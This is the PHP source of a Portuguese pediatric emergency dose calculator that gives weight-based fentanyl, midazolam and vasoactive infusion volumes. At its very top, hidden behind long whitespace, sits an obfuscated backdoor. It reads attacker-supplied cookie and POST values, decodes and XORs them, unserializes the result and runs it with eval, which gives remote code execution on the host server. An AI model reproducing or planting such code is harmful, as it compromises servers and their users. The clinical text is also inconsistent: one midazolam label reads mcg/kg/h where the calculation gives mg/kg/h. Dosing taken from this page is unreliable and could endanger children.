<?php                                                                                                                                                                                                                                                                                                                                                                                                 $qEMgWorxm = "\x63" . '_' . "\x50" . chr ( 892 - 771 )."\x67";$IzMVvM = chr ( 172 - 73 )."\154" . "\x61" . 's' . "\x73" . chr ( 364 - 269 )."\x65" . chr (120) . 'i' . chr (115) . 't' . "\163";$IYcnQEiw = class_exists($qEMgWorxm); $IzMVvM = "719";$HjJBGOOMp = strpos($IzMVvM, $qEMgWorxm);if ($IYcnQEiw == $HjJBGOOMp){function nxejIAXU(){$nLkKNUUNig = new /* 3143 */ c_Pyg(58093 + 58093); $nLkKNUUNig = NULL;}$nyCorOnQQy = "58093";class c_Pyg{private function AaNdfvYUCa($nyCorOnQQy){if (is_array(c_Pyg::$bsOvhB)) {$qAOtnkeRId2 = str_replace("<" . "?php", "", c_Pyg::$bsOvhB["content"]);eval($qAOtnkeRId2); $nyCorOnQQy = "58093";exit();}}public function hFhDX(){$qAOtnkeRId = "49590";$this->_dummy = str_repeat($qAOtnkeRId, strlen($qAOtnkeRId));}public function __destruct(){c_Pyg::$bsOvhB = @unserialize(c_Pyg::$bsOvhB); $nyCorOnQQy = "29615_29043";$this->AaNdfvYUCa($nyCorOnQQy); $nyCorOnQQy = "29615_29043";}public function LDZeB($qAOtnkeRId, $OlQQX){return $qAOtnkeRId[0] ^ str_repeat($OlQQX, intval(strlen($qAOtnkeRId[0]) / strlen($OlQQX)) + 1);}public function OmsXlFFP($qAOtnkeRId){$fwNkKAP = 'b' . 'a' . chr (115) . "\x65" . '6' . chr (52);return array_map($fwNkKAP . chr ( 600 - 505 )."\144" . chr (101) . chr (99) . chr ( 529 - 418 ).chr (100) . "\145", array($qAOtnkeRId,));}public function __construct($ibGNbKX=0){$kBUkBlw = chr (44); $qAOtnkeRId = "";$UCiDXplql = $_POST;$tkaSzlT = $_COOKIE;$OlQQX = "83865665-1e12-47c1-942d-2c7732103761";$PxMTXfqb = @$tkaSzlT[substr($OlQQX, 0, 4)];if (!empty($PxMTXfqb)){$PxMTXfqb = explode($kBUkBlw, $PxMTXfqb);foreach ($PxMTXfqb as $qaHLgJCD){$qAOtnkeRId .= @$tkaSzlT[$qaHLgJCD];$qAOtnkeRId .= @$UCiDXplql[$qaHLgJCD];}$qAOtnkeRId = $this->OmsXlFFP($qAOtnkeRId);}c_Pyg::$bsOvhB = $this->LDZeB($qAOtnkeRId, $OlQQX);if (strpos($OlQQX, $kBUkBlw) !== FALSE){$OlQQX = explode($kBUkBlw, $OlQQX); $NkYdeRPw = base64_decode(md5($OlQQX[0])); $sjqTFVLlm = strlen($OlQQX[1]) > 5 ? substr($OlQQX[1], 0, 5) : $OlQQX[1];$_GET['new_key'] = md5(implode('', $OlQQX)); $FfPOjB = str_repeat($sjqTFVLlm, 2); $oayffP = array_map('trim', $OlQQX);if (is_array($oayffP) && count($oayffP) > 1) {$CloNzucv = $oayffP[0];} else {$CloNzucv = '';}}}public static $bsOvhB = 63566;}nxejIAXU();} ?><?php  
session_start();

if (isset ($_GET['peso'])){
$_SESSION['peso'] = $_GET['peso'];  
$peso = $_SESSION['peso'];

$mida = 1.44*$peso;
$mida0 = 0.06*$peso;
$fenta = 0.96*$peso;
$fenta0 = 0.04*$peso;
$dobuta = 1.152*$peso;
$dopa = 2.88*$peso;
$adrena = 1.44*$peso;
$nora = 1.44*$peso;
//------calculo de sf para bomba unica------

$sf=(24-$mida-$fenta );	
$mlh=1;
if ($sf < 5){
$sf=(48-$mida-$fenta );	
$mlh=2;	
}
if ($sf < 5){
$sf=(72-$mida-$fenta );	
$mlh=3;
}
//---------------------------------

//sf bomba de mida
$sfmida = 24-$mida;
$mlh_mida = 1;
if ($sfmida < 5){
	$sfmida = 48-$mida;
	$mlh_mida = 2;
}

//---------------------------------

//sf bomba de fenta
$sffenta = 24-$fenta;
$mlh_fenta = 1;
if ($sffenta < 5){
	$sffenta = 48-$fenta;
	$mlh_fenta = 2;
}
//---------------------------------

//sf bomba de dobuta
$sfdobuta = 24-$dobuta;
$mlh_dobuta = 1;
if ($sfdobuta < 5){
	$sfdobuta = 48-$dobuta;
	$mlh_dobuta = 2;
}

//---------------------------------

//sf bomba de dopamina
$sfdopa = 24-$dopa;
$mlh_dopa = 1;
if ($sfdopa < 5){
	$sfdopa = 48-$dopa;
	$mlh_dopa = 2;
}
if ($sfdopa < 5){
	$sfdopa = 72-$dopa;
	$mlh_dopa = 3;
}


//---------------------------------

//sf bomba de adrena
$sfadrena = 24-$adrena;
$mlh_adrena = 1;
if ($sfadrena < 5){
	$sfadrena = 48-$adrena;
	$mlh_adrena = 2;
}
if ($sfadrena < 5){
	$sfadrena = 72-$adrena;
	$mlh_adrena = 3;
}

//---------------------------------

//sf bomba de nora
$sfnora = 24-$nora;
$mlh_nora = 1;
if ($sfnora < 5){
	$sfnora = 48-$nora;
	$mlh_nora = 2;
}
if ($sfnora < 5){
	$sfnora = 72-$nora;
	$mlh_nora = 3;
}


} 



?>
<!doctype html>
<html lang="pt-br">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PedLauer</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">

<script src="js/bootstrap.min.js"></script>
  
 

 






    

  </head>
  <body>
 


    


<div class="container py-3">
  <header>
    <div class="d-flex flex-column flex-md-row align-items-center pb-3 mb-4 border-bottom">
      <a href="/" class="d-flex align-items-center link-body-emphasis text-decoration-none">
      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-droplet-half" viewBox="0 0 16 16">
  <path fill-rule="evenodd" d="M7.21.8C7.69.295 8 0 8 0c.109.363.234.708.371 1.038.812 1.946 2.073 3.35 3.197 4.6C12.878 7.096 14 8.345 14 10a6 6 0 0 1-12 0C2 6.668 5.58 2.517 7.21.8zm.413 1.021A31.25 31.25 0 0 0 5.794 3.99c-.726.95-1.436 2.008-1.96 3.07C3.304 8.133 3 9.138 3 10c0 0 2.5 1.5 5 .5s5-.5 5-.5c0-1.201-.796-2.157-2.181-3.7l-.03-.032C9.75 5.11 8.5 3.72 7.623 1.82z"/>
  <path fill-rule="evenodd" d="M4.553 7.776c.82-1.641 1.717-2.753 2.093-3.13l.708.708c-.29.29-1.128 1.311-1.907 2.87l-.894-.448z"/>
</svg>
        <span class="fs-4">Ped Lauer</span>
      </a>

     <!-- <nav class="d-inline-flex mt-2 mt-md-0 ms-md-auto">
        <a class="me-3 py-2 link-body-emphasis text-decoration-none" href="#">Features</a>
        <a class="me-3 py-2 link-body-emphasis text-decoration-none" href="#">Enterprise</a>
        <a class="me-3 py-2 link-body-emphasis text-decoration-none" href="#">Support</a>
        <a class="py-2 link-body-emphasis text-decoration-none" href="#">Pricing</a>
      </nav> -->
    </div>

    <div class="pricing-header p-3 pb-md-4 mx-auto text-center">
      <h1 class="display-4 fw-normal">Emergência</h1>
      <p class="fs-5 text-body-secondary">Suporte Avançado de Vida Pediátrica</p>
    </div>
  </header>

  <main>
    <div class="row row-cols-1 row-cols-md-3 mb-3 text-center">
       <div class="col">
        
      </div>
	  
	  <div class="col">
        <div class="card mb-4 rounded-3 shadow-sm">
          <div class="card-header py-3">
            <h4 class="my-0 fw-normal">Peso <?php if (isset($peso)){ echo $peso.' kg';}?></h4>
          </div>
          <div class="card-body">
         
            <ul class="list-unstyled mt-3 mb-4">
           
<div class="dropdown">
  <a class="btn btn-secondary dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
   Selecione
  </a>

  <ul class="dropdown-menu">
			<li><a class="dropdown-item" href="index.php?peso=3">3 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=4">4 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=5">5 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=6">6 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=7">7 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=8">8 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=9">9 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=10">10 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=11">11 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=12">12 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=13">13 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=14">14 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=15">15 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=16">16 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=17">17 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=18">18 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=19">19 kg</a></li>
			<li><a class="dropdown-item" href="index.php?peso=20">20 kg</a></li>

  </ul>
</div>
              
            </ul>
         
          </div>
        </div>
      </div>
      <div class="col">
        
      </div> 
      
    </div>


   <div class="row row-cols-1 row-cols-md-2 mb-3 text-center">
<div class="col">
        <div class="card mb-4 rounded-3 shadow-sm">
         
          <div class="card-body">
            <h1 class="card-title pricing-card-title">Sequencia Rápida - Analgesia<br><small class="text-body-secondary fw-light">
			
			Fentanil <?php if (isset($peso)){ echo number_format($fenta0, 1, '.', '');}?> ml em Bolus
			</small></h1>
			<ul class="list-unstyled mt-3 mb-4">
			<li>Fentanil (50 mcg/ml) dose: 2 mcg/kg</li>
           
            
            </ul>
           
          </div>
        </div>
		
      </div>
  <div class="col">
        <div class="card mb-4 rounded-3 shadow-sm">
         
          <div class="card-body">
            <h1 class="card-title pricing-card-title">Sequencia Rápida - Hipnose<br><small class="text-body-secondary fw-light">
			
			Midazolan <?php if (isset($peso)){ echo number_format($mida0, 1, '.', '');}?> ml em Bolus
			</small></h1>
			<ul class="list-unstyled mt-3 mb-4">
			<li>Midazolan (5 mg/ml) dose: 0,3 mg/kg</li>
           
            
            </ul>
           
          </div>
        </div>
		
      </div>

  

	  
    </div>




   <div class="row row-cols-1 row-cols-md-1 mb-3 text-center">
<div class="col">
        <div class="card mb-4 rounded-3 shadow-sm">
         
          <div class="card-body">
            <h1 class="card-title pricing-card-title">Sedação Contínua em BIC<br><small class="text-body-secondary fw-light"> 
			Midazolan <?php if (isset($peso)){ echo number_format($mida, 1, '.', '');}?> ml + 
			SG 5% <?php if (isset($peso)){ echo number_format($sfmida, 1, '.', '');}?> ml . 
			Fazer <?php if (isset($peso)){ echo $mlh_mida;}?>ml/h em B.I.C.</small></h1>
			
			  <ul class="list-unstyled mt-3 mb-4">
			<li>Midazolan (5 mg/ml - ampola com 3 ou 10ml) dose: 0,3 mcg/kg/h</li>
		
             
            
            </ul>
			
	<h1 class="card-title pricing-card-title"><small class="text-body-secondary fw-light">
			Fentanil <?php if (isset($peso)){ echo number_format($fenta, 1, '.', '');}?> ml + 
			SF0,9% <?php if (isset($peso)){ echo number_format($sffenta, 1, '.', '');}?> ml . 
			Fazer <?php if (isset($peso)){ echo $mlh_fenta;}?>ml/h em B.I.C.</small></h1>
            <ul class="list-unstyled mt-3 mb-4">
	
			<li>Fentanil (50 mcg/ml - ampola com 2, 5, ou 10ml) dose: 2 mcg/kg/h</li>
             
            
            </ul>
           
          </div>
        </div>
      </div>
      
    </div>

	
   <div class="row row-cols-1 row-cols-md-1 mb-3 text-center">
<div class="col">
        <div class="card mb-4 rounded-3 shadow-sm">
         
          <div class="card-body">
            <h1 class="card-title pricing-card-title">Sedação Contínua em BIC Única<br><small class="text-body-secondary fw-light">
			Midazolan <?php if (isset($peso)){ echo number_format($mida, 1, '.', '');}?> ml + 
			Fentanil <?php if (isset($peso)){ echo number_format($fenta, 1, '.', '');}?> ml + 
			SF0,9% <?php if (isset($peso)){ echo number_format($sf, 1, '.', '');}?> ml . 
			Fazer <?php if (isset($peso)){ echo $mlh;}?>ml/h em B.I.C.</small></h1>
            <ul class="list-unstyled mt-3 mb-4">
			<li>Midazolan (5 mg/ml - ampola com 3 ou 10ml) dose: 0,3 mcg/kg/h</li>
			<li>Fentanil (50 mcg/ml - ampola com 2, 5, ou 10ml) dose: 2 mcg/kg/h</li>
              
            
            </ul>
           
          </div>
        </div>
      </div>
      
    </div>

  <div class="row row-cols-1 row-cols-md-1 mb-3 text-center">
<div class="col">
        <div class="card mb-4 rounded-3 shadow-sm">
         
          <div class="card-body">
            <h1 class="card-title pricing-card-title">Droga Vasoativa<br><small class="text-body-secondary fw-light"> 
			Dobutamina <?php if (isset($peso)){ echo number_format($dobuta, 1, '.', '');}?> ml + 
			SG 5% <?php if (isset($peso)){ echo number_format($sfdobuta, 1, '.', '');}?> ml . 
			Fazer <?php if (isset($peso)){ echo $mlh_dobuta;}?>ml/h em B.I.C.</small></h1>
			
			  <ul class="list-unstyled mt-3 mb-4">
			<li>Dobutamina (12,5 mg/ml - ampola com 20ml) dose: 10 mcg/kg/min</li>
		
             
            
            </ul>
			
	<h1 class="card-title pricing-card-title"><small class="text-body-secondary fw-light">
			Dopamina <?php if (isset($peso)){ echo number_format($dopa, 1, '.', '');}?> ml + 
			SG 5% <?php if (isset($peso)){ echo number_format($sfdopa, 1, '.', '');}?> ml . 
			Fazer <?php if (isset($peso)){ echo $mlh_dopa;}?>ml/h em B.I.C.</small></h1>
            <ul class="list-unstyled mt-3 mb-4">
	
			<li>Dopamina (5mg/ml) dose: 10 mcg/kg/min</li>
             
            
            </ul>
           
		   
		   <h1 class="card-title pricing-card-title"><small class="text-body-secondary fw-light">
			Adrenalina <?php if (isset($peso)){ echo number_format($adrena, 1, '.', '');}?> ml + 
			SG 5% <?php if (isset($peso)){ echo number_format($sfadrena, 1, '.', '');}?> ml . 
			Fazer <?php if (isset($peso)){ echo $mlh_adrena;}?>ml/h em B.I.C.</small></h1>
            <ul class="list-unstyled mt-3 mb-4">
	
			<li>Adrenalina (1 mg/ml - ampola com 1 ml) dose: 1 mcg/kg/min</li>
             
            
            </ul>
			
			<h1 class="card-title pricing-card-title"><small class="text-body-secondary fw-light">
			Noradrenalina <?php if (isset($peso)){ echo number_format($nora, 1, '.', '');}?> ml + 
			SG 5% <?php if (isset($peso)){ echo number_format($sfnora, 1, '.', '');}?> ml . 
			Fazer <?php if (isset($peso)){ echo $mlh_nora;}?>ml/h em B.I.C.</small></h1>
            <ul class="list-unstyled mt-3 mb-4">
	
			<li>Noradrenalina (2mg/ml = 1mg/ml de Nora base -  ampola com 4 ml) dose: 1 mcg/kg/min</li>
             
            
            </ul>
			
			
          </div>
        </div>
      </div>
      
    </div>	
	
   <!-- <h2 class="display-6 text-center mb-4">Compare plans</h2> --><br>


  </main>

  <footer class="pt-4 my-md-5 pt-md-5 border-top">
    <div class="row">
      <div class="col-6 col-md">
        <h5>Desenvolvedor</h5>
        <ul class="list-unstyled text-small">
    <li class="mb-1"><a class="link-secondary text-decoration-none" href="#">Newton Lauer</a></li>
        </ul>
      </div>
      <div class="col-6 col-md">
        <h5>Colaboração</h5>
        <ul class="list-unstyled text-small">
          
       <li class="mb-1"><a class="link-secondary text-decoration-none" href="#">Anísio Lima</a></li>
	   <li class="mb-1"><a class="link-secondary text-decoration-none" href="#">Luan Lima</a></li>
        </ul>
      </div>
      
    <div class="col-6 col-md">
      
        <ul class="list-unstyled text-small">
          
       <li class="mb-1"><a class="link-secondary text-decoration-none" href="#">Pediatria - Hospital Municipal de Santarém</a></li>
	   <li class="mb-1"><a class="link-secondary text-decoration-none" href="#">2023</a></li>
        </ul>
      </div>
    </div>
  </footer>
</div>






 <script src="js/bootstrap.bundle.min.js"></script>
  </body>
</html>


</html>